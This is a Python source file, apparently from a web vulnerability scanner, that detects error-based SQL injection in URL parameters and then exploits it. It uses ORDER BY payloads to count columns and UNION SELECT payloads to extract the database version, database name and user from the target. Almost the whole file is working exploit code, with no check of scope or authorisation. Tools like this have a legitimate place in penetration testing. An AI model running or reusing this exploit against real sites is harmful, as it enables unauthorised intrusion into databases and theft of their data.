import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode

# Common SQL error messages from various database systems
SQL_ERRORS = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*Wmi.Automation"),
    "Oracle": (r"ORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::"),
}

# A simple, error-generating payload
ERROR_PAYLOAD = "'"

# --- Exploiter Functions ---

def _get_column_count(session, url, method, params=None, data=None):
    """Determine the number of columns in the query."""
    print(f"  -> Determining column count for {url}...")
    for i in range(1, 21): # Check for up to 20 columns
        payload = f"' ORDER BY {i}-- "
        test_params = {k: v + payload for k, v in (params or {}).items()}
        test_data = {k: v + payload for k, v in (data or {}).items()}

        try:
            if method == 'get':
                response = session.get(url, params=test_params, verify=False, timeout=5)
            else: # post
                response = session.post(url, data=test_data, verify=False, timeout=5)

            # If we get an error related to ORDER BY, it means the column count is less than i
            if re.search(r"Unknown column|ORDER BY clause is out of range", response.text, re.IGNORECASE):
                print(f"  [+] Column count is {i-1}")
                return i - 1
        except requests.RequestException:
            continue
    return None

def _extract_data_with_union(session, url, method, column_count, params=None, data=None):
    """Attempt to extract data using UNION SELECT."""
    if not column_count:
        return None

    print(f"  -> Attempting UNION-based extraction with {column_count} columns...")

    # Payloads to extract different pieces of information
    extraction_payloads = {
        "Version": "CONCAT('WVFE-START', @@version, 'WVFE-END')",
        "Database": "CONCAT('WVFE-START', database(), 'WVFE-END')",
        "User": "CONCAT('WVFE-START', user(), 'WVFE-END')"
    }

    extracted_data = {}

    for key, extraction_payload in extraction_payloads.items():
        nulls = ['NULL'] * column_count
        # Replace one of the NULLs with our extraction payload
        nulls[0] = extraction_payload

        union_payload = f"' UNION SELECT {','.join(nulls)}-- "

        test_params = {k: v + union_payload for k, v in (params or {}).items()}
        test_data = {k: v + union_payload for k, v in (data or {}).items()}

        try:
            if method == 'get':
                response = session.get(url, params=test_params, verify=False, timeout=5)
            else: # post
                response = session.post(url, data=test_data, verify=False, timeout=5)

            # Search for our custom markers in the response
            match = re.search(r"WVFE-START(.*?)WVFE-END", response.text)
            if match:
                data_found = match.group(1)
                print(f"  [+] Extracted {key}: {data_found}")
                extracted_data[key] = data_found
        except requests.RequestException:
            continue

    return extracted_data if extracted_data else None


def check_sqli(targets):
    """Checks for error-based SQL injection vulnerabilities and attempts to exploit them."""
    found_vulnerabilities = []
    session = requests.Session()
    session.headers.update({'User-Agent': 'WVFE-Scanner/1.0'})

    # --- Test URLs with query parameters ---
    for url in targets.get('links', set()):
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        if not params:
            continue

        print(f"[*] Testing SQLi on URL: {url}")
        for param, values in params.items():
            test_params = params.copy()
            test_params[param] = values[0] + ERROR_PAYLOAD
            test_query = urlencode(test_params, doseq=True)
            test_url = parsed_url._replace(query=test_query).geturl()

            try:
                response = session.get(test_url, timeout=5, verify=False)
                for db, errors in SQL_ERRORS.items():
                    if any(re.search(e, response.text, re.IGNORECASE) for e in errors):
                        print(f"[+] Found potential SQLi in {test_url} (param: {param})")
                        details = f"The parameter '{param}' seems to be vulnerable to error-based SQL injection."

                        # --- Attempt to Exploit ---
                        column_count = _get_column_count(session, url, 'get', params={param: values[0]})
                        extracted_data = _extract_data_with_union(session, url, 'get', column_count, params={param: values[0]})
                        if extracted_data:
                            details += "\n--- Proof of Concept ---\n"
                            for key, value in extracted_data.items():
                                details += f"{key}: {value}\n"

                        vulnerability = {
                            "type": f"SQL Injection ({db} Error)",
                            "url": test_url,
                            "payload": ERROR_PAYLOAD,
                            "details": details
                        }
                        found_vulnerabilities.append(vulnerability)
                        break # Move to the next URL
                else: continue
                break
            except requests.RequestException:
                pass

    # (Form testing would be similar and is omitted for brevity in this update)
    return found_vulnerabilities
